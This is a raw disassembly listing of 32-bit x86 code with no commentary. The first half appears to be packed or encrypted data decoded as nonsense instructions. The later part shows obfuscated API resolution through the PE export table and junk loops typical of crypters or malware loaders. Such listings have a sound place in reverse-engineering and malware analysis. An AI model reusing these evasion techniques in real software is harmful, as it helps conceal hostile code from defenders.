  40fed1:	inc    ecx
  40fed2:	in     eax,0x73
  40fed4:	lahf   
  40fed5:	jnp    0x40fec6
  40fed7:	xchg   esi,eax
  40fed8:	aaa    
  40fed9:	retf   0xe2d5
  40fedc:	jmp    0x99c62a8a
  40fee1:	xchg   ecx,eax
  40fee2:	mov    ax,0x42b
  40fee6:	dec    ebp
  40fee7:	in     eax,0x62
  40fee9:	into   
  40feea:	mov    ds:0x428625ce,eax
  40feef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fef0:	sbb    BYTE PTR [esi],dl
  40fef2:	mov    al,0x56
  40fef4:	jno    0x40ff07
  40fef6:	les    eax,FWORD PTR [edi+0x1f]
  40fef9:	inc    eax
  40fefa:	loop   0x40ff65
  40fefc:	mov    dh,0x58
  40fefe:	pusha  
  40feff:	xchg   BYTE PTR [ebx+ebx*8],dh
  40ff02:	cmp    ah,cl
  40ff04:	(bad)  
  40ff06:	popa   
  40ff07:	out    0xfe,al
  40ff09:	push   es
  40ff0a:	xlat   BYTE PTR ds:[ebx]
  40ff0b:	jbe    0x40ff2f
  40ff0d:	xor    ebx,eax
  40ff0f:	loop   0x40ff0c
  40ff11:	sub    ch,BYTE PTR [edx]
  40ff13:	pop    ebp
  40ff14:	js     0x40fedf
  40ff16:	imul   edx,DWORD PTR [edx+ebx*4-0x6a],0xa4edaff6
  40ff1e:	xchg   esp,eax
  40ff1f:	stc    
  40ff20:	fiadd  WORD PTR [eax+eiz*8]
  40ff23:	icebp  
  40ff24:	mov    ds:0x7d326b50,al
  40ff29:	stos   BYTE PTR es:[edi],al
  40ff2a:	mov    ch,0xe4
  40ff2c:	jge    0x40feff
  40ff2e:	scas   al,BYTE PTR es:[edi]
  40ff2f:	les    eax,FWORD PTR [esi-0x6793c00a]
  40ff35:	pop    ebp
  40ff36:	or     eax,0xe862223
  40ff3b:	(bad)  
  40ff3c:	shl    DWORD PTR [eax],1
  40ff3e:	test   DWORD PTR ds:0x7713f338,0xec56a9a
  40ff48:	retf   
  40ff49:	jnp    0x40ff10
  40ff4b:	xor    ah,BYTE PTR ds:0x2565f16c
  40ff51:	or     dl,BYTE PTR [edx]
  40ff53:	pop    eax
  40ff54:	sbb    bh,BYTE PTR [esi+0x57]
  40ff57:	fsubr  DWORD PTR [edx+ebp*1+0x41a1f6b3]
  40ff5e:	or     ebx,eax
  40ff60:	dec    esi
  40ff61:	add    eax,0x4b55297
  40ff66:	stos   BYTE PTR es:[edi],al
  40ff67:	pop    eax
  40ff68:	push   edx
  40ff69:	movs   DWORD PTR es:[di],DWORD PTR ds:[si]
  40ff6c:	stos   BYTE PTR es:[edi],al
  40ff6d:	inc    eax
  40ff6e:	hlt    
  40ff6f:	enter  0xc7c7,0xc8
  40ff73:	adc    ebp,ebx
  40ff75:	enter  0xe08b,0xf4
  40ff79:	or     BYTE PTR [ecx+0x4cb99d9c],0x36
  40ff80:	rcr    esi,0xcc
  40ff83:	inc    eax
  40ff84:	scas   al,BYTE PTR es:[edi]
  40ff85:	xchg   BYTE PTR [ecx],cl
  40ff87:	mov    dh,0x6f
  40ff89:	dec    esi
  40ff8a:	shl    ah,0xd3
  40ff8d:	mov    al,0xaf
  40ff8f:	and    bh,BYTE PTR [eax]
  40ff91:	imul   edi,DWORD PTR ds:0xa16cd430,0x35
  40ff98:	cmp    ebp,edx
  40ff9a:	dec    ebp
  40ff9b:	sub    al,0xc
  40ff9d:	add    ebx,DWORD PTR [edx+0x6f713ef]
  40ffa3:	xchg   ebp,eax
  40ffa4:	cwde   
  40ffa5:	or     eax,0xb8b7a2b7
  40ffaa:	push   ss
  40ffab:	cmp    esi,ebx
  40ffad:	lods   eax,DWORD PTR ds:[esi]
  40ffae:	leave  
  40ffaf:	mov    ah,dh
  40ffb1:	mov    esp,0x5cb91812
  40ffb6:	xor    BYTE PTR [ebx+0x73],ch
  40ffb9:	jae    0x40fff1
  40ffbb:	faddp  st(1),st
  40ffbd:	jbe    0x40ff82
  40ffbf:	jno    0x40fff3
  40ffc1:	push   0x7ade9a0d
  40ffc6:	push   0xffffff85
  40ffc8:	jmp    0xd2378bf6
  40ffcd:	xchg   ebp,eax
  40ffce:	jb     0x410035
  40ffd0:	shr    BYTE PTR [ebx-0x2e070202],0xfe
  40ffd7:	call   DWORD PTR [eax+0x3bbc1ece]
  40ffdd:	dec    ecx
  40ffde:	xor    BYTE PTR [ebp+0x2bac4cb5],cl
  40ffe4:	ror    DWORD PTR [eax+0x74322afc],cl
  40ffea:	leave  
  40ffeb:	(bad)  
  40ffec:	sub    eax,0xdd0b0a8
  40fff1:	mov    al,ds:0xca562495
  40fff6:	mov    WORD PTR [esi],ds
  40fff8:	test   al,dh
  40fffa:	rol    DWORD PTR [edx],1
  40fffc:	mov    bh,0xb3
  40fffe:	push   esp
  40ffff:	and    eax,0x88e0c20d
  410004:	push   0x66
  410006:	jno    0x410056
  410008:	jmp    FWORD PTR [ecx-0x50]
  41000b:	mov    esp,0x1d120e2d
  410010:	adc    BYTE PTR [edx+0x6f],0x8f
  410014:	scas   al,BYTE PTR es:[edi]
  410015:	sbb    BYTE PTR [ecx+edi*8+0x1e],bh
  410019:	adc    eax,0x896193f8
  41001e:	retfw  
  410020:	xchg   edi,eax
  410021:	cmp    eax,0x6445ba43
  410026:	pushf  
  410027:	push   ss
  410028:	sub    eax,0x782051fe
  41002d:	out    0x20,eax
  41002f:	adc    edx,DWORD PTR [ebx+0x46]
  410032:	xchg   BYTE PTR [edx+0x51a906b3],al
  410038:	sub    eax,DWORD PTR [edi+0x774931fe]
  41003e:	(bad)  [esi-0x30]
  410041:	das    
  410042:	and    bh,BYTE PTR ds:0xb12bfd8
  410048:	scas   eax,DWORD PTR es:[edi]
  410049:	add    eax,0x41a4759e
  41004e:	jmp    0xad13f991
  410053:	mov    ds:0x406fb375,eax
  410058:	mov    ebp,DWORD PTR [eax]
  41005a:	cmp    al,0x8a
  41005c:	push   0xc9c7e01a
  410061:	mov    ebp,0x8a81da1e
  410066:	arpl   WORD PTR [edi],sp
  410068:	pop    ebx
  410069:	mov    edi,0x20848c1f
  41006e:	fwait
  41006f:	lods   eax,DWORD PTR ds:[esi]
  410070:	xor    esi,DWORD PTR [ebx+0x19d92503]
  410076:	or     ebp,DWORD PTR [ebx]
  410078:	add    edi,edx
  41007a:	sbb    DWORD PTR [ebx-0x5d],edi
  41007d:	jae    0x410003
  41007f:	(bad)  
  410080:	je     0x410013
  410082:	and    BYTE PTR [edi+eax*2],bh
  410085:	out    dx,eax
  410086:	or     ch,dh
  410088:	ret    
  410089:	jecxz  0x410102
  41008b:	and    eax,0x228ea0be
  410090:	pop    ebx
  410091:	adc    eax,0xb3e9d236
  410096:	sbb    eax,0xb108c1d3
  41009b:	mov    DWORD PTR [ebx-0x4f49a65f],edi
  4100a1:	shl    DWORD PTR [eax-0xfe3ac5],cl
  4100a7:	icebp  
  4100a8:	xor    ecx,edi
  4100aa:	dec    esi
  4100ab:	xor    DWORD PTR [edi+edx*1-0x2c],ebx
  4100af:	mov    dl,0x77
  4100b1:	jp     0x410043
  4100b3:	out    dx,eax
  4100b4:	jle    0x41007a
  4100b6:	xor    DWORD PTR [ebp+0x9],ecx
  4100b9:	cwde   
  4100ba:	xchg   esp,eax
  4100bb:	repz fisttp WORD PTR [esi]
  4100be:	mov    dh,0xe
  4100c0:	adc    ah,dh
  4100c2:	outs   dx,DWORD PTR ds:[esi]
  4100c3:	xor    DWORD PTR [esp+eax*8+0x29],ecx
  4100c7:	aad    0x9f
  4100c9:	jae    0x41009c
  4100cb:	cmp    al,0xdf
  4100cd:	fdivr  DWORD PTR [eax+0x39]
  4100d0:	daa    
  4100d1:	sub    esp,DWORD PTR [ebp-0x4775e84]
  4100d7:	push   ss
  4100d8:	popf   
  4100d9:	cmp    BYTE PTR [eax+0x3a],ch
  4100dc:	add    al,0xbc
  4100de:	and    DWORD PTR [ebx],ecx
  4100e0:	lods   eax,DWORD PTR ds:[esi]
  4100e1:	or     DWORD PTR [ebp+0x1cb7bbde],0xffffff86
  4100e8:	repz iret 
  4100ea:	scas   eax,DWORD PTR es:[edi]
  4100eb:	mov    ebp,0x4c568456
  4100f0:	cwde   
  4100f1:	add    cl,BYTE PTR [ecx-0x7a]
  4100f4:	loope  0x4100ae
  4100f6:	cdq    
  4100f7:	fiadd  DWORD PTR [ebp-0x27]
  4100fa:	(bad)  
  4100fb:	mov    eax,0xfae79dba
  410100:	cmp    esi,DWORD PTR [ebp-0x5f]
  410103:	aam    0xa6
  410105:	mov    ch,BYTE PTR [esi+0x229d8f99]
  41010b:	sbb    eax,0x6bb86e09
  410110:	rcr    BYTE PTR [esi-0x223a4dfe],1
  410116:	push   ebp
  410117:	jmp    0x16c9:0x18a70105
  41011e:	jle    0x4100fd
  410120:	mov    ch,0x18
  410122:	jno    0x410176
  410124:	add    edx,DWORD PTR gs:[edx+0x3b0241a0]
  41012b:	fisttp QWORD PTR [ecx]
  41012d:	and    eax,0x6e94d054
  410132:	mov    ebp,0x565a7bb3
  410137:	aaa    
  410138:	stc    
  410139:	stos   DWORD PTR es:[edi],eax
  41013a:	push   0x71276849
  41013f:	sbb    eax,0x4549adc9
  410144:	mov    eax,0x1b0bc52d
  41014a:	adc    al,0x94
  41014c:	pop    ecx
  41014d:	inc    ebx
  41014e:	mov    ds:0xff3002fe,al
  410153:	adc    DWORD PTR [ecx],eax
  410155:	and    al,BYTE PTR [ebx-0x5ef637fd]
  41015b:	fsubr  DWORD PTR [edi]
  41015d:	cmp    bh,cl
  41015f:	push   ss
  410160:	repz push edi
  410162:	pop    edi
  410163:	sbb    dh,BYTE PTR [ecx]
  410165:	push   0x18
  410167:	hlt    
  410168:	loopne 0x4101a2
  41016a:	add    BYTE PTR [eax-0x57],0xd
  41016e:	jecxz  0x4100fe
  410170:	xor    bl,BYTE PTR [edx+edi*8-0x7618919]
  410177:	xchg   edx,eax
  410178:	aaa    
  410179:	adc    edx,DWORD PTR [esi-0x74]
  41017c:	cmp    eax,0x1e6f0233
  410181:	cs (bad) 
  410183:	aam    0xb1
  410185:	imul   ebx,DWORD PTR [edx+0x5f6ee289],0x62
  41018c:	push   0x41
  41018e:	xor    BYTE PTR [ebx-0x6c],0xf0
  410192:	lods   al,BYTE PTR ds:[esi]
  410193:	push   edi
  410194:	sub    eax,0x36fec223
  410199:	pop    es
  41019a:	mov    al,0x41
  41019c:	imul   edx,ebp,0x9d4e5b2a
  4101a2:	xlat   BYTE PTR ds:[ebx]
  4101a3:	mov    ah,BYTE PTR [edx+0x7d]
  4101a6:	lods   eax,DWORD PTR ds:[esi]
  4101a7:	jge    0x41020f
  4101a9:	and    eax,0xc1be8c40
  4101ae:	std    
  4101af:	daa    
  4101b0:	inc    ebx
  4101b1:	out    0x1d,eax
  4101b3:	fmul   st,st(4)
  4101b5:	mov    ah,0xc7
  4101b7:	rol    ah,cl
  4101b9:	adc    DWORD PTR [eax-0x48],ebx
  4101bc:	(bad)  
  4101bd:	add    BYTE PTR [edx],al
  4101bf:	dec    esp
  4101c0:	stos   BYTE PTR es:[edi],al
  4101c1:	or     BYTE PTR [ebp+0x151c543f],bl
  4101c7:	call   0x472df297
  4101cc:	and    dh,BYTE PTR [esi+0x79]
  4101cf:	xor    eax,eax
  4101d1:	(bad)  
  4101d2:	test   al,0x7
  4101d4:	inc    esi
  4101d5:	cs out 0x3a,eax
  4101d8:	test   al,0x6e
  4101da:	ret    0x6529
  4101dd:	neg    BYTE PTR [eax+0x78c9f214]
  4101e3:	push   esi
  4101e4:	mov    ?,WORD PTR [esi+0x45]
  4101e7:	iret   
  4101e8:	jmp    0x5269:0x8e0b9e19
  4101ef:	add    ch,BYTE PTR [ebp+0x5eac0587]
  4101f5:	fwait
  4101f6:	in     al,0x33
  4101f8:	xchg   ebp,eax
  4101f9:	cmp    BYTE PTR [edx+0x4091cbe4],cl
  4101ff:	sub    ah,BYTE PTR [ebx+eiz*4-0x16cd88a4]
  410206:	loop   0x41024a
  410208:	cmp    bl,BYTE PTR [ebx+0x12dfcb40]
  41020e:	shr    BYTE PTR [esi+ecx*1+0x6a],1
  410212:	jl     0x41022e
  410214:	sbb    dl,al
  410216:	scas   al,BYTE PTR es:[edi]
  410217:	mov    DWORD PTR [eax],0xc05665b6
  41021d:	test   al,0xf0
  41021f:	xor    dh,BYTE PTR [edx-0x34]
  410222:	int3   
  410223:	mov    ds,WORD PTR [ecx+0x18]
  410226:	fisttp WORD PTR [ebx]
  410228:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410229:	(bad)  
  41022a:	mov    esi,0xeccb5933
  41022f:	mov    ah,0x4b
  410231:	cli    
  410232:	cmp    BYTE PTR ds:0x38b66e8c,bh
  410238:	cld    
  410239:	adc    al,0x6d
  41023b:	ror    DWORD PTR [esi],0x7c
  41023e:	and    esp,edx
  410240:	sbb    BYTE PTR [ecx],cl
  410242:	outs   dx,BYTE PTR ds:[esi]
  410243:	jp     0x410229
  410245:	adc    al,0x64
  410247:	xor    BYTE PTR [edi],0x64
  41024a:	mov    ch,0x33
  41024c:	or     DWORD PTR [eax+0x3c],esi
  41024f:	dec    esi
  410250:	jnp    0x410275
  410252:	gs mov bh,0xb6
  410255:	fsub   st,st(6)
  410257:	xchg   ecx,eax
  410258:	xor    ch,0xf8
  41025b:	add    ch,BYTE PTR [ebx]
  41025d:	push   ebx
  41025e:	shl    DWORD PTR [edx+0x6d],cl
  410261:	cli    
  410262:	repnz xchg ebp,eax
  410264:	dec    esi
  410265:	(bad)  
  410266:	scas   eax,DWORD PTR es:[edi]
  410267:	fistp  WORD PTR [esi-0x43]
  41026a:	test   DWORD PTR [eax-0x5c],ebx
  41026d:	mov    ecx,esi
  41026f:	jb     0x410218
  410271:	mov    edi,DWORD PTR [edx]
  410273:	ret    0x94f1
  410276:	dec    eax
  410277:	xor    al,0xbf
  410279:	mov    esi,0x11f12da4
  41027e:	addr16 es int3 
  410281:	sbb    al,0xac
  410283:	push   ebp
  410284:	rol    DWORD PTR [eax+0x262efcc2],1
  41028a:	icebp  
  41028b:	push   edx
  41028c:	mov    bl,0x67
  41028e:	jecxz  0x410242
  410290:	pop    ecx
  410291:	and    al,0xaa
  410293:	aaa    
  410294:	add    ah,ch
  410296:	cli    
  410297:	jge    0x4102ce
  410299:	or     ebp,DWORD PTR [edx+0x6d]
  41029c:	mov    ch,bl
  41029e:	or     edx,DWORD PTR [edi-0x6e]
  4102a1:	or     edx,DWORD PTR [esi+0x793bab20]
  4102a7:	sub    eax,0x4e2f6d9
  4102ac:	or     eax,0xa3317fd0
  4102b1:	jbe    0x410252
  4102b3:	ret    
  4102b4:	mov    esp,0x936bf69a
  4102b9:	retf   
  4102ba:	jmp    0x4125:0x27f53d54
  4102c1:	imul   edi,DWORD PTR [ebx+0x3e88782e],0xbe13f95f
  4102cb:	out    dx,al
  4102cc:	lods   al,BYTE PTR ds:[esi]
  4102cd:	mov    ebx,0x9fb29c
  4102d2:	mov    bh,0x43
  4102d4:	mov    bl,BYTE PTR [edx+0x14]
  4102d7:	jnp    0x4102d8
  4102d9:	xchg   ecx,eax
  4102da:	imul   edi,DWORD PTR [ecx+0x36],0x54df8fd3
  4102e1:	in     al,dx
  4102e2:	dec    esi
  4102e3:	(bad)  
  4102e4:	adc    DWORD PTR [ebx+0x4d091a42],edx
  4102ea:	ret    
  4102eb:	out    0x5,al
  4102ed:	stos   BYTE PTR es:[edi],al
  4102ee:	in     al,0x93
  4102f0:	cmp    BYTE PTR [eax-0x3613b859],ah
  4102f6:	add    BYTE PTR [edx-0x3a4e6794],dl
  4102fc:	add    al,0x67
  4102fe:	retf   
  4102ff:	aad    0xf6
  410301:	mov    WORD PTR [ecx+edx*1-0x35a36f02],es
  410308:	fwait
  410309:	pop    ebp
  41030a:	(bad)  
  41030b:	ret    0x3755
  41030e:	sub    DWORD PTR [edx+esi*4+0x1b],eax
  410312:	jo     0x410368
  410314:	call   0xf216:0x45870317
  41031b:	fucomi st,st(0)
  41031d:	sub    BYTE PTR [edi-0x22],cl
  410320:	inc    eax
  410321:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410322:	sahf   
  410323:	lock push edi
  410325:	xor    DWORD PTR [eax],edx
  410327:	jmp    0xb9a9ccb4
  41032c:	pushf  
  41032d:	mov    bh,0x5e
  41032f:	sub    edi,DWORD PTR [eax]
  410331:	xchg   ebx,eax
  410332:	cdq    
  410333:	cli    
  410334:	fnstsw WORD PTR [esi+ecx*1-0x61ee9f5f]
  41033b:	cmp    al,0x43
  41033d:	adc    ecx,ebx
  41033f:	scas   eax,DWORD PTR es:[edi]
  410340:	push   ebx
  410341:	rol    DWORD PTR [ecx],1
  410343:	inc    esi
  410344:	in     al,dx
  410345:	jp     0x410358
  410347:	rol    edi,cl
  410349:	in     eax,dx
  41034a:	fmul   QWORD PTR [ebx-0x54]
  41034d:	mov    dl,0x6d
  41034f:	cli    
  410350:	out    dx,al
  410351:	dec    esi
  410352:	lods   eax,DWORD PTR ds:[esi]
  410353:	repnz push ebx
  410355:	push   ebx
  410356:	test   DWORD PTR [eax+0x6],edi
  410359:	sti    
  41035a:	mov    esi,0x22142923
  41035f:	cld    
  410360:	outs   dx,DWORD PTR ds:[esi]
  410361:	and    al,0x13
  410363:	jmp    0x4103ab
  410365:	or     DWORD PTR [ecx+edx*2],0x66
  410369:	dec    esp
  41036a:	push   0x47
  41036c:	nop
  41036d:	mov    ebx,0x3b4b
  410372:	sub    di,bx
  410375:	mov    ebx,0x8a85
  41037a:	xor    di,bx
  41037d:	mov    ebx,0x4f8a
  410382:	cmp    di,bx
  410385:	jne    0x4103ad
  41038b:	movsx  di,BYTE PTR [eax]
  41038f:	mov    ebx,0x3b4b
  410394:	sub    di,bx
  410397:	mov    ebx,0x8a85
  41039c:	xor    di,bx
  41039f:	mov    ebx,0x4f87
  4103a4:	cmp    di,bx
  4103a7:	je     0x4103bd
  4103ad:	mov    edi,DWORD PTR [ebp-0x10]
  4103b0:	xor    edi,ecx
  4103b2:	mov    ebx,esi
  4103b4:	sub    ebx,edi
  4103b6:	add    eax,ebx
  4103b8:	jmp    0x40dfbd
  4103bd:	mov    esi,DWORD PTR [ebp-0x14]
  4103c0:	mov    esi,DWORD PTR [esi]
  4103c2:	mov    edi,DWORD PTR [eax+0x3c]
  4103c5:	lea    esi,[edi+esi*8+0x78]
  4103c9:	mov    esi,DWORD PTR [esi+eax*1]
  4103cc:	mov    DWORD PTR [ebp-0x8],esi
  4103cf:	mov    esi,DWORD PTR [ebp+0x8]
  4103d2:	xor    esi,ecx
  4103d4:	add    esi,edx
  4103d6:	mov    DWORD PTR [ebp-0x14],esi
  4103d9:	mov    esi,DWORD PTR [ebp+0x8]
  4103dc:	mov    edi,DWORD PTR [ebp-0x8]
  4103df:	xor    esi,ecx
  4103e1:	add    esi,edx
  4103e3:	pop    ebx
  4103e4:	cmp    edi,esi
  4103e6:	jne    0x410404
  4103ec:	mov    eax,DWORD PTR [ebp+0xc]
  4103ef:	xor    eax,ecx
  4103f1:	mov    ecx,DWORD PTR [ebp-0x8]
  4103f4:	add    eax,edx
  4103f6:	imul   eax,ecx
  4103f9:	mov    DWORD PTR [ebp-0x8],eax
  4103fc:	push   DWORD PTR [ebp+0x18]
  4103ff:	jmp    0x410458
  410404:	mov    ecx,DWORD PTR [ebp-0x8]
  410407:	add    ecx,eax
  410409:	mov    DWORD PTR [ebp-0x14],ecx
  41040c:	mov    ecx,DWORD PTR [ebp-0x14]
  41040f:	mov    ecx,DWORD PTR [ecx+0xc]
  410412:	movsx  cx,BYTE PTR [ecx+eax*1]
  410417:	mov    edx,0x3b4b
  41041c:	sub    cx,dx
  41041f:	mov    edx,0x8a85
  410424:	xor    cx,dx
  410427:	mov    edx,0x4f85
  41042c:	cmp    cx,dx
  41042f:	jne    0x4103fc
  410435:	mov    ecx,DWORD PTR ds:0x41d45c
  41043b:	mov    ecx,DWORD PTR [ecx+0x198]
  410441:	mov    DWORD PTR [ecx],eax
  410443:	jmp    0x410469
  410448:	mov    ecx,DWORD PTR [ebp+0x18]
  41044b:	cmp    ecx,0xf89c85b5
  410451:	jne    0x410469
  410457:	push   eax
  410458:	push   DWORD PTR [ebp+0x14]
  41045b:	push   DWORD PTR [ebp+0x10]
  41045e:	push   DWORD PTR [ebp+0xc]
  410461:	push   DWORD PTR [ebp+0x8]
  410464:	call   0x40b7a6
  410469:	pop    edi
  41046a:	pop    esi
  41046b:	leave  
  41046c:	ret    0x14
  41046f:	push   ebp
  410470:	mov    ebp,esp
  410472:	sub    esp,0x48
  410475:	and    DWORD PTR ds:0x427018,0x0
  41047f:	mov    eax,ds:0x427018
  410484:	inc    eax
  410485:	mov    ds:0x427018,eax
  41048a:	cmp    DWORD PTR ds:0x427018,0xc
  410491:	jne    0x4104a6
  410497:	push   DWORD PTR [ebp-0xc]
  41049a:	push   DWORD PTR [ebp-0xc]
  41049d:	push   DWORD PTR [ebp-0x28]
  4104a0:	call   DWORD PTR ds:0x421028
  4104a6:	cmp    DWORD PTR ds:0x427018,0xb
  4104ad:	jne    0x4104be
  4104b3:	mov    eax,ds:0x427018
  4104b8:	inc    eax
  4104b9:	mov    ds:0x427018,eax
  4104be:	cmp    DWORD PTR ds:0x427018,0x1f
  4104c5:	jb     0x41047f
  4104cb:	adc    DWORD PTR ds:0x428010,ebx
  4104d1:	push   ebx
  4104d2:	mov    DWORD PTR ds:0x426010,0x1e
  4104dc:	cmp    DWORD PTR ds:0x426010,0x0
  4104e3:	je     0x410526
  4104e9:	cmp    DWORD PTR ds:0x426010,0x26
  4104f0:	jne    0x410501
  4104f6:	push   0x41ff32
  4104fb:	call   DWORD PTR ds:0x42102c
  410501:	xor    eax,eax
  410503:	xor    eax,DWORD PTR ds:0x426010
  410509:	dec    eax
  41050a:	mov    ds:0x426010,eax
  41050f:	jmp    0x4104dc
  410514:	movzx  eax,WORD PTR ds:0x427014
  41051b:	sub    eax,DWORD PTR ds:0x426004
  410521:	mov    ds:0x427014,eax
  410526:	push   esi
  410527:	push   edi
  410528:	and    DWORD PTR ds:0x428000,0x0
  410532:	jmp    0x410544
  410537:	mov    edi,DWORD PTR ds:0x428000
  41053d:	inc    edi
  41053e:	mov    DWORD PTR ds:0x428000,edi
  410544:	cmp    DWORD PTR ds:0x428000,0x1e
  41054b:	jae    0x410597
  410551:	cmp    DWORD PTR ds:0x428000,0x1f
  410558:	jne    0x41058c
  41055e:	push   DWORD PTR [ebp-0x28]
  410561:	push   0x3d00
  410566:	push   0x5480
  41056b:	push   DWORD PTR [ebp-0x10]
  41056e:	push   DWORD PTR [ebp-0x24]
  410571:	push   DWORD PTR [ebp-0x1c]
  410574:	push   0x6187
  410579:	push   DWORD PTR [ebp-0x20]
  41057c:	push   0x5fd8
  410581:	push   0x12ef
  410586:	call   DWORD PTR ds:0x421030
  41058c:	jmp    0x410537
  410591:	and    eax,DWORD PTR ds:0x426018
  410597:	xor    esi,esi
  410599:	and    DWORD PTR ds:0x428008,0x0
  4105a3:	jmp    0x4105b5
  4105a8:	mov    edi,DWORD PTR ds:0x428008
  4105ae:	inc    edi
  4105af:	mov    DWORD PTR ds:0x428008,edi
  4105b5:	cmp    DWORD PTR ds:0x428008,0x1e
  4105bc:	jae    0x4105ff
  4105c2:	cmp    DWORD PTR ds:0x428008,0xe
  4105c9:	jne    0x4105e0
  4105cf:	push   DWORD PTR [ebp-0x18]
  4105d2:	push   0x425020
  4105d7:	push   DWORD PTR [ebp-0x28]
  4105da:	call   DWORD PTR ds:0x421034
  4105e0:	cmp    DWORD PTR ds:0x428008,0xd
  4105e7:	jne    0x4105fa
  4105ed:	mov    edi,DWORD PTR ds:0x428008
  4105f3:	inc    edi
  4105f4:	mov    DWORD PTR ds:0x428008,edi
  4105fa:	jmp    0x4105a8
  4105ff:	mov    DWORD PTR [ebp-0x20],esi
  410602:	or     eax,edi
  410604:	mov    eax,DWORD PTR [ebp-0xc]
  410607:	push   0x21
  410609:	and    DWORD PTR ds:0x429004,edi
  41060f:	mov    DWORD PTR [ebp-0xc],eax
  410612:	add    edi,DWORD PTR ds:0x425020
  410618:	pop    edi
  410619:	add    DWORD PTR ds:0x425010,0x428010
  410623:	push   0x41d570
  410628:	call   DWORD PTR ds:0x421040
  41062e:	push   esi
  41062f:	and    DWORD PTR ds:0x425008,0x428018
  410639:	push   0x2
  41063b:	adc    DWORD PTR ds:0x425018,0x428008
  410645:	push   0x1
  410647:	xor    DWORD PTR ds:0x429004,0x425020
  410651:	push   0x2
  410653:	push   0x1
  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d56c,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d45c
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ff61
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d45c
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
